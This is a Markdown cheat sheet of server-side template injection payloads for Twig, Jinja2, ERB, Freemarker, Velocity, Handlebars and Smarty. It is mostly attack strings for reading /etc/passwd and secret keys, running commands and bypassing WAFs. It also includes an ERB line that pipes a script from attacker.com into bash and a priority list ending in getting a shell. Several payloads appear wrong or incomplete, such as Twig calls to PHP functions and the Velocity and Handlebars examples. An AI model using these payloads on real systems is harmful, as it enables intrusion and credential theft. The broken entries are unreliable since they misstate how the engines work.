# SSTI (Server Side Template Injection)

## Detection

### Basic Probes

####Twig (PHP)
```
{{7*7}}
{{7*'7'}}
{{dump(app)}}
```

#### Jinja2 (Python)
```
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

#### ERB (Ruby)
```
<%= 7*7 %>
<%= system('whoami') %>
```

#### Blade (PHP/Laravel)
```
{{7*7}}
{{config}}
{@php echo 7*7; @endphp}
```

#### Freemarker (Java)
```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

#### Velocity (Java)
```
#set($x = 1)
$x=$x.toString()
#set($e=$x.class.forName('java.lang.Runtime'))
#set($p=$e.getRuntime().exec('whoami'))
```

## Twig (PHP/Symfony)

### Basic injection
```
{{_self.env}}
{{_self.class}}
{{7*7}}
```

### Read files
```
{{file_get_contents('/etc/passwd')}}
{{include('/etc/passwd')}}
```

### RCE
```
{{_self.env.set('cmd','whoami')}}
{{_self.env.get('cmd')}}

{{system('whoami')}}
{{exec('whoami')}}
```

### Dump variables
```
{{dump(app)}}
{{app.session.get('_ flashing').get('debug')}}
```

## Jinja2 (Python/Flask)

### Basic injection
```
{{7*7}}
{{config}}
{{request}}
```

### Read environment
```
{{config}}
{{config.SQLALCHEMY_DATABASE_URI}}
{{config.SECRET_KEY}}
```

### Read file
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{''.__class__.__bases__[0].__subclasses__()}}
```

### RCE via subclasses
```
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True)}}
```

### Sandbox escape
```
{{cycler.__init__.__globals__}}
```

## ERB (Ruby on Rails)

### Basic injection
```
<%= 7*7 %>
<%= 1+1 %>
```

### Command execution
```
<%= system('whoami') %>
<%= `whoami` %>
<%= %x[whoami] %>
```

### File read
```
<%= File.read('/etc/passwd') %>
```

### RCE chain
```
<%= system('curl https://attacker.com/shell.sh|bash') %>
```

## Freemarker (Java)

### Basic injection
```
${7*7}
${product}
```

### RCE
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

### Read file
```
${s.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

## Velocity (Java)

### Basic injection
```
#set($x = 1)
#set($e = $x.class.forName('java.lang.Runtime'))
#set($p = $e.getRuntime().exec('whoami'))
```

### Blind exploit
```
#set($str = $tool.getClass().getClassLoader().getClass().forName('java.lang.String'))
#set($chr = $str.getDeclaredMethod('charAt', $tool.getClass().forName('java.lang.Integer')).getReturnType())
```

## Handlebars (Node.js)

### Basic injection
```
{{666}}
{{#each this}}{{this}}{{/each}}
```

### RCE (if eval allowed)
```
{{#with "constructor"}}
  {{#with (create null)}}
    {{this}}
  {{/with}}
{{/with}}
```

## Smarty (PHP)

### Basic injection
```
{$smarty.version}
{php}echo `whoami`;{/php}
```

### RCE
```
{php}system('whoami');{/php}
{system('whoami')}
```

### Read file
```
{include file='/etc/passwd'}
```

## Twig vs Jinja2 vs ERB Quick Reference

| Engine | Syntax | RCE |
|--------|--------|-----|
| Twig | {{}} | system(), dump() |
| Jinja2 | {{}} | config, subclasses |
| ERB | <%= %> | system(), File.read |
| Freemarker | ${} | Execute?new() |
| Velocity | #set | exec() |
| Handlebars | {{}} | constructor |
| Smarty | {} | {php}system{/php} |

## WAF Bypass

### Python (Jinja2)
```
{{7*7}} → {{config}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Obfuscation
{{config["__class__"]}}
{{request["__class__"]}}
```

### PHP (Twig)
```
{{_self.env}}
{{dump(_self)}}
{{_self.env.set('debug','1')}}

# Unicode bypass
{{app.attributes.get('debug\u0027)}}
```

## Context Analysis

| Context | Injection | Output |
|---------|-----------|--------|
| HTML | {{7*7}} | 49 |
| JavaScript | {{7*7}} | 49 |
| Attribute | {{7*7}} | 49 |
| URL | {{7*7}} | 49 |
| Style | {{7*7}} | 49 |

## Blind SSTI

### Time-based detection
```
{{sleep(5)}}
{{benchmark(5000000,md5('x'),500)}}
```

### OAST detection
```
{{lipsum['__globals__']}}
{{lipsum['__init__']}}
```

## Common Endpoints for SSTI

```
/render
/template
/page
/view
/home
/debug
/test
/profile
/api/view
```

## Exploitation Priority

1. **Read config** - Secret keys, database creds
2. **Read source** - Application logic
3. **RCE** - Get shell
4. **Read files** - /etc/passwd, sensitive docs